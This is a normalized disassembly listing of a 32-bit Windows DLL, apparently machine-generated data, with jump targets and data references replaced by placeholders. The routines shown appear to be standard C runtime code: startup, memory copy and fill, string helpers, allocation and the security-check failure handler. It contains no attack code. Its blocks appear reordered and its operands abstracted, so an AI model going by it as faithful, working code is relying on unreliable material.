jne r-xdata
dec edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ esi ] ax
call sub_1000a3c4
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
movzx ecx [ eax ]
mov [ edx + eax ] cx
add eax 0x2
test cx cx
je r-xdata
call sub_1000acab
mov eax esi
sub_100098eb
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ DecodePointer@IAT ]
push edi
push [ rw-data ]
call esi
push [ rw-data ]
mov ebx eax
mov [ ebp - 0x4 ] ebx
call esi
mov esi eax
cmp esi ebx
jb r-xdata
xor eax eax
mov edi esi
sub edi ebx
lea eax [ edi + 0x4 ]
cmp eax 0x4
jb r-xdata
push ebx
call sub_1000e1f2
mov ebx eax
lea eax [ edi + 0x4 ]
pop ecx
cmp ebx eax
jae r-xdata
push [ ebp + 0x8 ]
mov edi [ EncodePointer@IAT ]
call edi
mov [ esi ] eax
add esi 0x4
push esi
call edi
mov [ rw-data ] eax
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov eax 0x800
cmp ebx eax
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn
add eax ebx
cmp eax ebx
jb r-xdata
mov eax ebx
lea eax [ ebx + 0x10 ]
cmp eax ebx
jb r-xdata
push eax
push [ ebp - 0x4 ]
call sub_1000dc55
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
push [ ebp - 0x4 ]
call sub_1000dc55
pop ecx
pop ecx
test eax eax
je r-xdata
sar edi 0x2
push eax
lea esi [ eax + edi * 4 ]
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
sub_100099a1
mov edi edi
push esi
push 0x4
push 0x20
call sub_1000dc09
pop ecx
pop ecx
mov esi eax
push esi
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
mov [ rw-data ] eax
test esi esi
jne r-xdata
and [ esi ] 0x0
xor eax eax
pop esi
retn
push 0x18
pop eax
pop esi
retn
sub_100099d2
push 0xc
push r--data
call sub_1000bc40
call sub_1000bfc5
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_100098eb
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10009a08
mov eax [ ebp - 0x1c ]
call sub_1000bc85
retn
sub_10009a34
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
push [ rw-data ]
call [ DecodePointer@IAT ]
mov esi eax
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
and [ eax ] 0x0
push edi
test esi esi
jne r-xdata
call sub_1000a3c4
push 0x16
pop esi
mov [ eax ] esi
call sub_1000acab
mov eax esi
jmp r-xdata
push 0x4
push [ ebp + 0x8 ]
call esi
test eax eax
jne r-xdata
push r--data
call [ LoadLibraryW@IAT ]
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
pop esi
leave
retn
xor eax eax
call sub_1000a3c4
mov [ eax ] 0xc
call sub_1000a3c4
mov eax [ eax ]
jmp r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
mov esi eax
test esi esi
jne r-xdata
call sub_1000a3c4
push 0x16
pop esi
mov [ eax ] esi
call sub_1000acab
mov eax esi
jmp r-xdata
pop edi
push ebx
push esi
call [ EncodePointer@IAT ]
mov edi eax
call sub_1000d6e2
push edi
push rw-data
mov ebx eax
call [ InterlockedExchange@IAT ]
cmp eax ebx
pop ebx
je r-xdata
call sub_1000a3c4
mov esi [ GetLastError@IAT ]
mov edi eax
call esi
push eax
call sub_1000a382
pop ecx
mov [ edi ] eax
call sub_1000acab
call esi
push eax
call sub_1000a382
pop ecx
jmp r-xdata
push [ ebp - 0x4 ]
call [ FreeLibrary@IAT ]
sub_10009b24
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
mov ebx [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
push esi
cmp ebx 0x4
jb r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
lea esi [ ebx - 0x4 ]
test esi esi
je r-xdata
pop ebx
leave
retn
cmp esi ebx
jb r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov dl [ eax ]
test dl dl
je r-xdata
xor eax eax
movzx eax [ eax - 0x4 ]
movzx ecx [ ecx - 0x4 ]
jmp r-xdata
cmp dl [ ecx - 0x4 ]
jne r-xdata
movzx eax [ eax ]
movzx ecx [ ecx ]
cmp dl [ ecx ]
jne r-xdata
sub eax ecx
jmp r-xdata
mov dl [ eax - 0x3 ]
test dl dl
je r-xdata
pop esi
inc eax
inc esi
inc ecx
movzx eax [ eax - 0x3 ]
movzx ecx [ ecx - 0x3 ]
jmp r-xdata
cmp dl [ ecx - 0x3 ]
jne r-xdata
mov dl [ eax - 0x2 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x2 ]
movzx ecx [ ecx - 0x2 ]
jmp r-xdata
cmp dl [ ecx - 0x2 ]
jne r-xdata
mov dl [ eax - 0x1 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x1 ]
movzx ecx [ ecx - 0x1 ]
jmp r-xdata
cmp dl [ ecx - 0x1 ]
jne r-xdata
add [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x4 ] esi
jb r-xdata
mov dl [ eax ]
add eax 0x4
add ecx 0x4
test dl dl
je r-xdata
jmp r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
sub_10009be4
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax edx
mov cx [ edx ]
add edx 0x2
test cx cx
jne r-xdata
sub edx 0x2
cmp [ ebp + 0x10 ] 0x0
push esi
je r-xdata
xor ecx ecx
mov [ edx ] cx
mov esi [ ebp + 0xc ]
pop esi
pop ebp
retn
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
movzx ecx [ esi ]
dec [ ebp + 0x10 ]
mov [ edx ] cx
add edx 0x2
add esi 0x2
test cx cx
je r-xdata
sub_10009c28
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
xor eax eax
pop ebp
retn
movzx eax [ ecx ]
movzx ecx [ edx ]
sub eax ecx
pop ebp
retn
movzx eax [ ecx ]
test ax ax
je r-xdata
cmp ax [ edx ]
jne r-xdata
add ecx 0x2
add edx 0x2
jmp r-xdata
dec [ ebp + 0x10 ]
je r-xdata
sub_10009c77
push 0x8
push r--data
call sub_1000bc40
mov eax [ ebp + 0xc ]
cmp eax 0x1
jne r-xdata
xor edi edi
cmp eax edi
jne r-xdata
call sub_1000a40d
test eax eax
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ rw-data ] edi
jle r-xdata
call sub_1000da49
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
cmp eax 0x3
jne r-xdata
call sub_1000d6f4
push 0x214
push 0x1
call sub_1000dc09
pop ecx
pop ecx
mov esi eax
cmp esi edi
je r-xdata
dec [ rw-data ]
mov [ ebp - 0x4 ] edi
cmp [ rw-data ] edi
jne r-xdata
call sub_1000e91a
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_1000e883
mov [ rw-data ] eax
call sub_1000e2ba
test eax eax
jns r-xdata
call sub_1000a42b
jmp r-xdata
call sub_1000bc85
retn 0xc
xor eax eax
inc eax
push edi
call sub_1000d9db
pop ecx
push esi
push [ rw-data ]
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
test eax eax
je r-xdata
cmp [ ebp + 0x10 ] edi
jne r-xdata
call sub_1000c21b
call sub_1000e7c8
test eax eax
js r-xdata
call sub_1000d728
jmp r-xdata
push esi
call sub_10009181
pop ecx
jmp r-xdata
push edi
push esi
call sub_1000d765
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
mov [ esi ] eax
or [ esi + 0x4 ] 0xffffffff
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10009d50
jmp r-xdata
call sub_1000e4ff
call sub_1000d728
call sub_1000a42b
call sub_1000e4ff
jmp r-xdata
call sub_1000e552
test eax eax
js r-xdata
push 0x0
call sub_1000c02e
pop ecx
test eax eax
jne r-xdata
inc [ rw-data ]
jmp r-xdata
sub_10009ddb
push 0xc
push r--data
call sub_1000bc40
mov edi ecx
mov esi edx
mov ebx [ ebp + 0x8 ]
xor eax eax
inc eax
mov [ ebp - 0x1c ] eax
test esi esi
jne r-xdata
and [ ebp - 0x4 ] 0x0
cmp esi eax
je r-xdata
cmp [ rw-data ] edx
je r-xdata
mov eax [ r--data ]
test eax eax
je r-xdata
cmp esi 0x2
jne r-xdata
xor eax eax
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push edi
push esi
push ebx
call eax
mov [ ebp - 0x1c ] eax
push edi
push esi
push ebx
call sub_10002dd0
mov [ ebp - 0x1c ] eax
cmp esi 0x1
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
push edi
push esi
push ebx
call sub_10009c77
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
test esi esi
je r-xdata
test eax eax
jne r-xdata
push edi
push esi
push ebx
call sub_10009c77
test eax eax
jne r-xdata
cmp esi 0x3
jne r-xdata
push edi
push eax
push ebx
call sub_10002dd0
push edi
push 0x0
push ebx
call sub_10009c77
mov eax [ r--data ]
test eax eax
je r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
and [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
jmp r-xdata
push edi
push 0x0
push ebx
call eax
mov eax [ r--data ]
test eax eax
je r-xdata
call sub_1000bc85
retn
push edi
push esi
push ebx
call eax
mov [ ebp - 0x1c ] eax
_start
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x1
jne r-xdata
push [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_10009ddb
pop ecx
pop ebp
retn 0xc
call sub_1000e966
sub_10009ef4
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
push edi
push 0x8
pop ecx
mov esi r--data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
pop edi
mov [ ebp - 0x4 ] eax
pop esi
test eax eax
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
leave
retn 0x8
test [ eax ] 0x8
je r-xdata
mov [ ebp - 0xc ] 0x1994000
sub_10009f43
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x320 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x328 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x324 ] eax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
push 0x1
call sub_1000ea01
pop ecx
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push r--data
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
push 0xc0000409
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
leave
retn
push 0x1
call sub_1000ea01
pop ecx
sub_1000a049
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
push edi
test edx edx
je r-xdata
call sub_1000a3c4
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov esi edx
sub esi eax
mov [ edx ] al
jmp r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ edx ] 0x0
call sub_1000a3c4
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov cl [ eax ]
mov [ esi + eax ] cl
inc eax
test cl cl
je r-xdata
call sub_1000acab
mov eax esi
jmp r-xdata
sub_1000a0b0
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea esp [ esp ]
lea esp [ esp ]
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_1000a13b
push 0xc
push r--data
call sub_1000bc40
push 0xe
call sub_1000cc92
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000a1a2
call sub_1000bc85
retn
mov eax [ rw-data ]
mov edx rw-data
push [ esi + 0x4 ]
call sub_10009181
pop ecx
and [ esi + 0x4 ] 0x0
cmp [ eax ] ecx
jne r-xdata
mov edx eax
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
push eax
call sub_10009181
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
sub_1000a1b0
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
add edx 0x1
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
add eax 0x1
retn
or al al
je r-xdata
or al al
je r-xdata
add ecx 0x1
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_1000a247
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call eax
pop ecx
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_1000a382
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ecx * 8 + rw-data ]
pop ebp
retn
inc ecx
cmp ecx 0x2d
jb r-xdata
cmp eax [ ecx * 8 + rw-data ]
je r-xdata
lea ecx [ eax - 0x13 ]
cmp ecx 0x11
ja r-xdata
add eax 0xffffff44
push 0xe
pop ecx
cmp ecx eax
sbb eax eax
and eax ecx
add eax 0x8
pop ebp
retn
push 0xd
pop eax
pop ebp
retn
sub_1000a3ea
mov edi edi
push ebp
mov ebp esp
push esi
call sub_1000a3d7
mov ecx [ ebp + 0x8 ]
push ecx
mov [ eax ] ecx
call sub_1000a382
pop ecx
mov esi eax
call sub_1000a3c4
mov [ eax ] esi
pop esi
pop ebp
retn
sub_1000a43f
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
imul ecx [ ebp + 0xc ]
push esi
mov esi ecx
test esi esi
jne r-xdata
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax [ ebp + 0xc ]
jae r-xdata
xor eax eax
cmp esi 0xffffffe0
ja r-xdata
inc esi
call sub_1000a3c4
mov [ eax ] 0xc
xor eax eax
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
push esi
call sub_1000a247
pop ecx
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov [ ecx ] 0xc
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov [ eax ] 0xc
sub_1000a4c1
call sub_1000ea5e
test eax eax
je r-xdata
test [ rw-data ] 0x2
je r-xdata
push 0x16
call sub_1000ea6b
pop ecx
push 0x3
call sub_1000c205
int3
push 0x1
push 0x40000015
push 0x3
call sub_1000ab30
add esp 0xc
sub_1000a4f4
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
and edx [ ebp + 0xc ]
not ecx
and ecx eax
or ecx edx
mov [ rw-data ] ecx
pop ebp
retn
sub_1000a515
mov edi edi
push ebp
mov ebp esp
xor eax eax
mov eax [ eax * 8 + r--data ]
pop ebp
retn
inc eax
cmp eax 0x16
jb r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx [ eax * 8 + r--data ]
je r-xdata
xor eax eax
pop ebp
retn
sub_1000a53b
mov edi edi
push ebp
mov ebp esp
sub esp 0x1fc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_1000a515
mov edi eax
xor ebx ebx
pop ecx
mov [ ebp - 0x1fc ] edi
cmp edi ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10008bf6
leave
retn
push 0x3
call sub_1000ee0a
pop ecx
cmp eax 0x1
je r-xdata
push 0xfffffff4
call [ GetStdHandle@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
push 0x3
call sub_1000ee0a
pop ecx
test eax eax
jne r-xdata
cmp esi 0xffffffff
je r-xdata
cmp esi 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
xor eax eax
push r--data
push 0x314
mov edi rw-data
push edi
call sub_10009888
add esp 0xc
test eax eax
jne r-xdata
push ebx
lea eax [ ebp - 0x1fc ]
push eax
lea eax [ ebp - 0x1f8 ]
push eax
mov [ ebp - 0x5 ] bl
call sub_1000a0b0
pop ecx
push eax
lea eax [ ebp - 0x1f8 ]
push eax
push esi
call [ WriteFile@IAT ]
inc eax
cmp eax 0x1f4
jb r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
jmp r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] ax
call [ GetModuleFileNameW@IAT ]
mov ebx 0x2fb
test eax eax
jne r-xdata
mov cl [ edi + eax * 2 ]
mov [ ebp + eax - 0x1f8 ] cl
cmp [ edi + eax * 2 ] bx
je r-xdata
call sub_1000ac59
push esi
call sub_1000edef
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
push r--data
push ebx
push esi
call sub_10009888
add esp 0xc
test eax eax
je r-xdata
push r--data
mov esi 0x314
push esi
push edi
call sub_1000ed7a
add esp 0xc
test eax eax
jne r-xdata
push esi
call sub_1000edef
lea eax [ eax * 2 + rw-data ]
mov ecx eax
sub ecx esi
push 0x3
sar ecx 0x1
push r--data
sub ebx ecx
push ebx
push eax
call sub_10009788
add esp 0x14
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
push [ ebp - 0x1fc ]
push esi
push edi
call sub_1000ed7a
add esp 0xc
test eax eax
jne r-xdata
push 0x12010
push r--data
push edi
call sub_1000ec0e
add esp 0xc
jmp r-xdata
sub_1000a6ea
push 0x3
call sub_1000ee0a
pop ecx
cmp eax 0x1
je r-xdata
push 0xfc
call sub_1000a53b
push 0xff
call sub_1000a53b
pop ecx
pop ecx
push 0x3
call sub_1000ee0a
pop ecx
test eax eax
jne r-xdata
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_1000a740
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
test al al
jne r-xdata
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
cmp edx 0x80
jb r-xdata
mov [ edi ] al
add edi 0x1
sub edx 0x1
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
jmp sub_1000ee49
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
jne r-xdata
sub_1000a7c0
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x80
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_1000a844 ]
jmp [ ecx * 4 + jump_table_1000a8c4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1000a930 ]
jmp r-xdata
jmp [ ecx * 4 + jump_table_1000aacc ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_1000a9d0 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1000aacc ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_1000a930 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
push edi
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_1000aacc ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1000a930 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1000a930 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1000a930 ]
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1000aacc ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1000aacc ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1000aacc ]
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
test ecx ecx
je r-xdata
jmp r-xdata
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
pop eax
pop esi
pop edi
pop ebp
retn
mov edx ecx
shr edx 0x4
test edx edx
je r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
and ecx 0xf
je r-xdata
lea ebx [ ebx ]
mov eax ecx
shr ecx 0x2
je r-xdata
movdqa xmm0 [ esi ]
movdqa [ edi ] xmm0
lea esi [ esi + 0x10 ]
lea edi [ edi + 0x10 ]
dec edx
jne r-xdata
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
